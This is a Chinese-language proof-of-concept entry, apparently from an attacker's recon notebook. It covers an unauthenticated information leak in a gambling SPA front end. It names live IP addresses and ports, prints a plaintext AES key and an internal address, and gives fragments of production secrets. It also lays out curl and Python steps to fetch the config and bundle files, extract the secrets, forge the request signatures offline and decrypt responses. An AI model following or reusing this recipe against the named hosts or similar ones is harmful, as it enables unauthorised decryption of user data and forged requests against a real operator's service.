# K8 系 SPA 前端制品未授权可读：/saconfig/secure/yunwei.js 暴露 AES 密钥 + 主 bundle 硬编码 live-service 生产 SECRET（签名可离线复算）

- **code**: spa-yunwei-js-aeskey-and-bundle-live-service-secret-offline
- **kind**: poc
- **category**: info-leak
- **component**: 自研博彩/棋牌 SPA 前端（openresty 反代 + CDN 静态 bundle + live-service 网关）
- **severity**: medium
- **language**: markdown
- **source**: self
- **verified**: 1
- **verified_note**: task#614（2026-11-05）实测，本机 python requests（trust_env=False, verify=False）零凭据只读 GET，请求间隔≥3s：① GET https://35.241.95.15:32325/saconfig/secure/yunwei.js → HTTP 200 / text/javascript / 1306B，正文含 aesKey:'pJK8xVrtLrBHhW4r'、needEncrypt:'1'、imageServer:'https://91a2c0front-wc.hbu14.com'、cdns 四条、wss 地址；② GET /cdn/91a2c0FNEW/static/js/app~748942c6.5bc82ad5.js → HTTP 200 / 801771B（md5 cddf2ea057a9c824），离线正则抽出模块 329a 的三套 SECRET（prod 9394404b…、stg 814b5cdc…、fat 4a1f5441…）、prod DOMAIN、内网地址 10.82.5.118 与签名公式 sign=MD5(productId|time|SECRET)，模块 a078 抽出 productId/appid/v/apiNameSpace/RSA webkey。两台主机（35.241.95.15:32325 / 35.220.211.187:2222）同路径返回内容一致，全程 0 Cookie/0 认证头，故判定「未授权可读 + 密钥硬编码」成立；未执行目标 JS、未调用其业务写接口。
- **path**: pocs/spa-yunwei-js-aeskey-and-bundle-live-service-secret-offline/poc.md
- **tags**: spa, frontend, bundle, yunwei.js, saconfig, aes-key, hardcoded-secret, live-service, sign-forgery, unauth, info-leak, 10.82.5.118
- **created_at**: 2026-11-04T21:06:46.478Z
- **engine**: https://35.241.95.15:32325/saconfig/secure/yunwei.js（同族 35.220.211.187:2222 同路径同内容）
- **found_by**: recon

## 描述

两台裸 IP 前端零凭据即可取到运维配置 /saconfig/secure/yunwei.js 与 CDN 上的主业务 bundle：前者明文给出响应加密 AES 密钥（CBC、IV=key）与全部 imageServer/CDN/WS 地址；后者硬编码 live-service 三套环境（prod/stg/fat）共享 SECRET、productId/appid/apiNameSpace/RSA webkey 与内网地址。由于业务签名 Sign 完全由客户端字段推导（MD5(sortString(JSON.stringify(body))+Qid+AppId+v)，无服务端盐），而 live-service 签名 = MD5(productId|time|SECRET)，两端"签名门"均可离线复算，不构成鉴权。前提仅需网络可达该端口。

## 用法

```
只读两步即可复现（间隔≥3s，本机有代理时 requests 用 trust_env=False / curl 用 --noproxy '*'，自签证书 verify=False / -k）：
1) curl -k -sS https://<HOST>:<PORT>/saconfig/secure/yunwei.js | grep -E "aesKey|imageServer|needEncrypt|cdns"
2) 从 index.html 的 script src 或 yunwei.js 里的 CDN 基址取主包路径，例：GET /cdn/<站点ID>FNEW/static/js/app~<hash>.js，再离线正则：
   python -c "import re;t=open('app.js',encoding='utf-8',errors='ignore').read();print(re.findall(r'SECRET:\"([0-9a-f]{32})\"',t));print(re.findall(r'productId:\"([A-Za-z0-9]{20,})\"',t));print(re.findall(r'(?:\d{1,3}\.){3}\d{1,3}',t)[:10])"
3) 复算签名：live-service sign = md5(f"{productId}|{time}|{SECRET}")；业务 Sign = md5(sortString(json.dumps(body))+Qid+AppId+v)。AES 解密响应 body 用 AES-128-CBC，key=IV=提取到的 16 位 aesKey。
注意：本条目只做了「未授权可读 + 离线复算」验证，未向生产 live-service 域名实际发请求，故 severity 维持 medium；不要把这段当"已能调用生产接口"的结论。
```

## 正文

```
# SPA 前端制品未授权可读 → AES 密钥 + live-service 生产 SECRET（可离线复算签名）

## 0. 适用面与前提

- 目标形态：博彩/棋牌类自研 SPA，前端由 openresty 反代多台裸 IP（同一套制品部署多主机），静态资源同时挂 CDN。
- 前提：只需网络可达前端端口（`https://<IP>:<PORT>`），**不需要账号 / Cookie / 任何认证头**。
- 环境注意：
  - 本机有代理时，requests 必须 `Session.trust_env=False`，curl 必须 `--noproxy '*'`，否则回包会被出口代理改写，拿不到真实 bundle。
  - 多为自签证书：`verify=False` / `curl -k`。
  - 只读 GET，间隔 ≥3s，不要打业务写接口。

## 1. 运维配置（AES 密钥 + 全部静态/CDN/WS 地址）

```http
GET /saconfig/secure/yunwei.js HTTP/1.1
Host: <HOST>:<PORT>
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/130.0.0.0
```

实测回包（结构示意，1240B 左右）：

```js
window.yunweiConfig = {
  aesKey: '<16 位明文密钥>',
  iv:     '<同 key 或独立 IV>',
  needEncrypt: '1',
  imageServer: 'https://<前端CDN域>',
  cdns: [ 'https://<cdn1>', 'https://<cdn2>', ... ],
  messageSocketUrl: 'wss://<ws 域>/ws',
  wmsPath: '_l'
}
```

判据：`200` + `Content-Type: application/javascript` + 正文含 `aesKey:` 且长度 16。
用途：`needEncrypt=1` 说明业务响应体是密文，可直接用该 key 做 AES-128-CBC（`iv=key`）解密，无需逆向。

## 2. 主 bundle（live-service SECRET / productId / appid / 内网地址）

路径形态（版本会变，先从 `index.html` 的 `<script src>` 或 yunwei.js 里的 CDN 基址取实际 hash）：

```
GET /cdn/<站点ID>FNEW/static/js/app~<hash>.js
# 实测: /cdn/91a2c0FNEW/static/js/app~748942c6.5bc82ad5.js  → 200 / 801771B
```

离线抽取（不解包、不执行 JS）：

```bash
python - <<'PY'
import re
t = open('app.js', encoding='utf-8', errors='ignore').read()
print(re.findall(r'SECRET:"([0-9a-f]{32})"', t))          # 三套环境 SECRET
print(re.findall(r'DOMAIN:"([^"]+)"', t))                  # fat/stg/prod 网关域名
print(re.findall(r'productId:"([A-Za-z0-9]{20,})"', t))
print(re.findall(r'appid:"([A-F0-9]{32})"', t))
print(re.findall(r'apiNameSpace:"([^"]+)"', t))
print(re.findall(r'webkey:"([^"]+)"', t))                  # RSA 公钥，通常是 MIGfMA0GCSq...
print(sorted(set(re.findall(r'(?:\d{1,3}\.){3}\d{1,3}', t)))[:20])   # 内网地址
PY
```

实测结果形态：

```js
// 模块 329a
t = { SECRET: '<fat 32hex>', DOMAIN: 'http://<fat-live-service 域>' }
e = { SECRET: '<stg 32hex>', DOMAIN: 'https://<stg-live-service 域>' }
n = { SECRET: '<prod 32hex>', DOMAIN: 'https://<prod-live-service 域>' }
// sign = MD5(productId + '|' + time + '|' + SECRET)
// host 映射表另含内网 10.x.x.x 与多条备用业务域

// 模块 a078
{ host: yunweiConfig.apiUrl + '/', productId: '<32位>', appid: '<32hex>',
  v: '1.0.0', apiNameSpace: 'api', webkey: 'MIGfMA0GCSqGSIb3...' }
```

## 3. 两端签名公式（都是客户端可复算，无服务端盐）

| 场景 | 公式 |
|---|---|
| live-service 网关 | `sign = md5(f"{productId}|{time}|{SECRET}")`，`time` 为秒级时间戳 |
| 业务接口 | `Sign = md5(sortString(JSON.stringify(body)) + Qid + AppId + v)`，字段按 key 升序拼接，无服务端盐 |
| 响应/请求加密 | AES-128-CBC，`key = aesKey`，`iv = key`，body 为 base64 |

推论（需单独验证，勿直接当结论）：三套 SECRET 与 prod 域名同时出现在公开 bundle，意味着任何拿到 bundle 的人都能离线生成 live-service 侧合法签名头；业务接口的 `Sign` 同理。**本条目只验证了"可读 + 可复算"，未向生产网关实发请求。**

## 4. 常见失败原因 / 排查

| 现象 | 原因与处理 |
|---|---|
| `yunwei.js` 404 | 版本差异；先看 `index.html` 里真实路径，或试 `/saconfig/secure/` 目录下其它 js |
| 200 但正文是代理页/空 | 走了本机代理：`trust_env=False` / `--noproxy '*'`，并校验 `Server:` 头是目标 openresty |
| 403 / 412 / 提示 TEST-ERROR | 需要浏览器 UA + 固定出口 IP，单发不复重 |
| bundle 里搜不到 SECRET | 主包已拆：遍历 `static/js/*.js` 与 manifest，全量 grep `SECRET:"` |
| 解密密文乱码 | IV 未等于 key、或 body 还套了一层 base64；先确认 `needEncrypt` 与编码序 |

## 5. 影响与边界

- 正向：响应加密与签名门对攻击者完全透明，可解密服务端返回的配置/业务数据，可离线构造合法签名请求。
- 边界：本条为**未授权信息泄露**，未验证向 live-service 生产域发请求的可用性；severity 维持 medium。若后续实测签名被接受并返回业务数据，可升级为 auth-bypass / unauthorized。
- 证伪条件：两份文件需要登录态才可取，或内容不含明文 SECRET / aesKey。

```
